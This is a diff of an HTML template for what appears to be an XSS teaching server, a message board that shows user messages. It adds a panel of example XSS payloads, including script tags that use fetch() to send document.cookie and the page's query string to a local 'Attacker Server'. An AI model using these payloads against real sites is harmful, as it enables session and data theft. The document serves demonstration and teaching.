@@ -4,16 +4,84 @@
         <meta charset="utf-8" />
         <meta name="viewport" content="width=device-width, initial-scale=1.0" />
         <title>Test Server</title>
+        <link
+            rel="icon"
+            href="https://www.flaticon.com/free-icon/exam_895984?term=testing&page=1&position=12&page=1&position=12&related_id=895984&origin=tag"
+        />
+        <link
+            rel="stylesheet"
+            href="https://cdnjs.cloudflare.com/ajax/libs/tailwindcss/2.0.3/tailwind.min.css"
+            integrity="sha512-wl80ucxCRpLkfaCnbM88y4AxnutbGk327762eM9E/rRTvY/ZGAHWMZrYUq66VQBYMIYDFpDdJAOGSLyIPHZ2IQ=="
+            crossorigin="anonymous"
+        />
     </head>
-    <body>
-        <form>
-            <input
-                name="newMessage"
-                placeholder="Enter your message"
-            />
-            <button type="submit">Submit</button>
-        </form>
-        <h1>Messages</h1>
-        <dl>$messages$</dl>
-    </body>
+    <header class="py-5 pl-10 bg-indigo-500 text-white">
+        Web Attack Solutions Test Server
+        <h1 class="float-right pr-10">XSS Attack Simulation</h1>
+    </header>
+    <div class="h-auto">
+        <body
+            class="container m-auto bg-white shadow-md rounded px-8 pt-6 pb-8 mb-4 flex flex-col"
+        >
+            <form class="container justify-center">
+                <input
+                    class="border p-2 border-indigo-500 w-3/4 rounded-md"
+                    name="newMessage"
+                    placeholder="Enter your message"
+                />
+                <button
+                    class="border border-indigo-500 bg-indigo-500 text-white w-1/5 rounded-md px-4 py-2 m-2 transition duration-500 ease select-none hover:bg-indigo-400 focus:outline-none focus:shadow-outline"
+                    type="submit"
+                >
+                    Submit
+                </button>
+            </form>
+            <div
+                class="container m-auto bg-white shadow-md content-start rounded px-8 pt-6 pb-8 mb-4 flex flex-col"
+            >
+                <div
+                    class="container m-auto bg-white shadow-md rounded relative max-h-60 overflow-scroll overflow-x-hidden px-8 pt-6 pb-8 mb-4 flex flex-col"
+                >
+                    <h1 class="font-extrabold text-xl p-2">Messages:</h1>
+                    <dl class="p-2">$messages$</dl>
+                </div>
+                <div
+                    class="container m-auto bg-white shadow-md rounded px-8 pt-6 pb-8 mb-4 flex flex-col"
+                >
+                    <h1 class="font-extrabold text-xl">Example Attacks:</h1>
+                    <p class="w-auto p-4">
+                        <textarea class="w-full resize-none" disabled rows="1">
+<img src="no file" onerror=alert(document.cookie);></textarea
+                        >
+                        <textarea class="w-full resize-none" disabled rows="1">
+<script>alert('hello')</script></textarea
+                        >
+                        <textarea class="w-full resize-none" disabled rows="1">
+<b onmouseover=alert('Hacked')>Hover Over Me</b></textarea
+                        >
+                    </p>
+                    <h1 class="font-extrabold text-xl">
+                        Advanced Attacks: Visit the
+                        <a
+                            class="text-blue-700"
+                            href="http://localhost:3000"
+                            target="_blank"
+                            >Attacker Server</a
+                        >
+                    </h1>
+                    <p class="w-auto p-4">
+                        <textarea class="w-full resize-none" disabled rows="3">
+<script>fetch(`http://localhost:3000?data=${encodeURIComponent(window.location.search)}`)</script>
+</textarea
+                        >
+                        <textarea class="w-full resize-none" disabled rows="3">
+<script>fetch(`http://localhost:3000?data=${document.cookie}`)</script>
+</textarea
+                        >
+                    </p>
+                </div>
+            </div>
+        </body>
+    </div>
+    <footer class="text-center">© Parmjit Singh Gill 2021</footer>
 </html>
